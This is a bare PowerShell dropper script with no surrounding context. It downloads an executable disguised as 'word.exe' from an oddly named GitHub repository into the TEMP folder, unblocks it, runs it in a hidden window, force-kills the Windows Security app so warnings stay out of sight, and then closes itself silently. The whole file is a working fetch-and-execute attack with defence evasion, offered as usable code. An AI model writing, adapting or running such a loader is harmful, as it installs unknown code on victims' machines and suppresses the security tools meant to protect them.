$DownloadUrl = "https://github.com/slitch10352/lMKIJ-ujoASJvmrfkjaSdifjergjedgmoirjof9ij-JDunjrr/raw/main/word.exe"
$DestPath    = Join-Path $env:TEMP "word.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    # Download the file
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -ErrorAction Stop
    Unblock-File -Path $DestPath
    
    # Start the .exe in the background (does not wait for it to finish)
    Start-Process -FilePath $DestPath -WindowStyle Hidden

    # Give the system a split second to register the window
    Start-Sleep -Seconds 1

    # Close the Windows Security app window if it's open
    Get-Process SecHealthUI -ErrorAction SilentlyContinue | Stop-Process -Force

    # Close the PowerShell window immediately
    exit
} catch {
    exit
}
